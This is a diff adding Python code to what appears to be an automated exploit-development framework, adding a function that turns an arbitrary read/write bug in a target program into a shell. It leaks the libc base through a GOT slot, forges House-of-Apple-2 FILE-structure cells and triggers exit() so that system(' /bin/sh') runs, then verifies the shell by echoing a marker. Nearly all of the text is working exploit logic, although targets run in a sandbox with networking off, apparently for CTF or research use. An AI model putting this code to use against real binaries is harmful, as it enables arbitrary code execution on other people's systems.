@@ -2515,3 +2515,136 @@ def heap_fsop_exploit(exe, workdir, *, add, free, view, edit, exit_seq, libc_dat
         res3 = res4
     res3["reason"] = (f"{res.get('reason')}; then {res2.get('reason')}; then {res3.get('reason')}")
     return res3
+
+
+# ----------------------------------------------- write-what-where -> shell (no win, no leak given)
+#: What an `arr[i] = v` style write primitive can disclose and then forge. The two sides of the
+#: same bug: the unchecked index reads a GOT slot (a libc address, once that function has been
+#: called) and writes House-of-Apple-2 cells over a FILE, so a target with NO win function, no
+#: `system` in its PLT and ASLR on still reaches a shell. Everything is in-band and in ONE process.
+_WWW_MARKER = b"LYKOS-WWW-7731"
+
+
+def _int_candidates(out: bytes) -> list:
+    """Every 64-bit value a read of one memory word could have printed, as unsigned: a decimal
+    (`printf("%ld")`, the dominant shape -- negative because the word's top bit is set; a single
+    digit counts, since a word that reads back as 0 is one of the things we check for), a hex
+    literal (`%p`/`%lx`), and each raw little-endian 8-byte window (a target that writes the word
+    out as bytes). Order matters only in that each is TESTED against a predicate (does it resolve a
+    page-aligned libc base; is it the value we just wrote), so a wrong candidate is rejected, never
+    guessed at."""
+    vals = []
+    for m in re.finditer(rb"-?\d+", out):               # single digits too: a word that reads 0
+        vals.append(int(m.group(0)) & 0xFFFFFFFFFFFFFFFF)
+    for m in re.finditer(rb"0x([0-9a-fA-F]{2,16})", out):
+        vals.append(int(m.group(1), 16))
+    for i in range(max(0, len(out) - 7)):
+        win = out[i:i + 8]
+        if all(b == 0 or 0x20 <= b <= 0x7E for b in win):
+            continue                                     # printable -> prompt text, not a word
+        vals.append(struct.unpack("<Q", win)[0])
+    return vals
+
+
+def indexed_write_fsop(exe, workdir, *, write_cell, read_cell, libc_data, leak_slots,
+                       scratch: int, exit_seqs=(b"q\n",), marker: bytes = _WWW_MARKER,
+                       timeout: float = 14.0, base_argv=(), mem_mb: int = 2048) -> dict:
+    """Turn a one-word-at-a-time ARBITRARY WRITE (plus the arbitrary READ that usually comes with
+    it) into a spawned shell, with no win function and no `system` in the target's PLT.
+
+      1. libc leak  -- read a GOT slot whose libc function has already been called; the resolved
+         address minus that symbol's offset in the libc the target actually links is the base, and
+         `rop.resolve_libc_base` accepts it only if the result is page aligned.
+      2. the FILE    -- read the forged FILE's own `_wide_data` out of the target rather than
+         guessing it, and check the wide `_IO_buf_base` it points at is NULL (the condition
+         `_IO_wdoallocbuf` tests). Both are leaks the same primitive already gives us.
+      3. five cells  -- `heap.house_of_apple2_cells`, written in order and each READ BACK, so a
+         cell that did not land is a stated failure rather than a crash at the trigger.
+      4. the trigger -- each of `exit_seqs` in turn makes the program return from main, so exit()
+         walks `_IO_list_all` and the forged FILE's overflow is `system(" /bin/sh")`. Several are
+         tried on the SAME live process: the cells are already in place, so a sequence that does
+         not exit costs one prompt rather than a whole run.
+
+    `write_cell(addr, value) -> bytes` and `read_cell(addr) -> bytes` render the target's own input
+    for one write / one read; `leak_slots` is [(got_address, libc_symbol_name)] in try order;
+    `scratch` is a writable address whose +0x68 may be used for the fake wide jump table (the
+    target's own global array). Confirmed by a shell echoing `marker`. Returns
+    {ok, libc_base, fp, cells, reason}."""
+    from . import heap as _heap
+    from . import rop
+    T = _heap.house_of_apple2_cell_targets(libc_data)
+    if not T:
+        return {"ok": False, "reason": "libc lacks _IO_2_1_stderr_/_IO_wfile_jumps/system"}
+    syms = rop.libc_symbols(libc_data, tuple({n for _a, n in leak_slots}))
+    usable = [(a, n) for a, n in leak_slots if n in syms]
+    if not usable:
+        return {"ok": False, "reason": "no GOT slot names a symbol the linked libc exports"}
+
+    exedir = str(Path(exe).resolve().parent)
+    cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir]) + \
+        [str(exe)] + [str(a) for a in base_argv]
+    try:
+        p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+                             stderr=subprocess.STDOUT, cwd=exedir, start_new_session=True,
+                             preexec_fn=sandbox._rlimits(mem_mb, int(timeout) + 6, set_as=True))
+    except Exception as e:                               # noqa: BLE001
+        return {"ok": False, "reason": f"spawn failed: {e!r}"}
+
+    def _op(seq, read_secs=0.3):
+        try:
+            p.stdin.write(seq)
+            p.stdin.flush()
+        except (BrokenPipeError, OSError):
+            return b""
+        return _read_until(p, time.time() + read_secs, quiet=0.2)
+
+    def _read(addr, secs=0.3):
+        return _int_candidates(_op(read_cell(addr), secs))
+
+    try:
+        _op(b"", 0.3)                                    # the first prompt
+        base = None
+        for addr, name in usable:
+            for v in _read(addr):
+                base = rop.resolve_libc_base(v, syms[name])
+                if base:
+                    break
+            if base:
+                break
+        if not base:
+            return {"ok": False, "reason": "no GOT read resolved a page-aligned libc base "
+                                           "(the slot may still be unresolved / lazily bound)"}
+        fp = base + T["fp"]
+        wide = next((v for v in _read(fp + T["wide_data_field"]) if base <= v < base + 0x600000),
+                    None)
+        if wide is None:
+            return {"ok": False, "libc_base": base,
+                    "reason": f"read of {T['fp_name']}+{T['wide_data_field']:#x} disclosed no "
+                              "libc-range _wide_data pointer"}
+        if 0 not in _read(wide + T["wide_buf_base_field"]):
+            return {"ok": False, "libc_base": base,
+                    "reason": "the forged FILE's wide _IO_buf_base is not NULL, so "
+                              "_IO_wdoallocbuf would not take the allocate path"}
+        cells = _heap.house_of_apple2_cells(fp, wide_data=wide, wide_vtable=scratch,
+                                            wfile_jumps=base + T["wfile_jumps"],
+                                            system=base + T["system"])
+        for addr, val in cells:
+            _op(write_cell(addr, val))
+            if val not in _read(addr):
+                return {"ok": False, "libc_base": base, "cells": [(hex(a), hex(v)) for a, v in cells],
+                        "reason": f"cell {addr:#x} := {val:#x} did not read back; the write "
+                                  "primitive does not reach that address"}
+        for seq in (tuple(exit_seqs) or (b"",)):
+            out = _op(seq, 0.6) if seq else b""
+            out += _op(b"echo " + marker + b"\n", 1.2)
+            if marker in out:
+                return {"ok": True, "libc_base": base, "fp": fp, "wide_data": wide,
+                        "cells": [(hex(a), hex(v)) for a, v in cells], "fp_name": T["fp_name"],
+                        "exit_seq": seq}
+            if p.poll() is not None:
+                break
+        return {"ok": False, "libc_base": base, "cells": [(hex(a), hex(v)) for a, v in cells],
+                "reason": "the five cells landed but no trigger spawned a shell "
+                          f"(exit {p.poll()!r})"}
+    finally:
+        sandbox.kill_quietly(p)
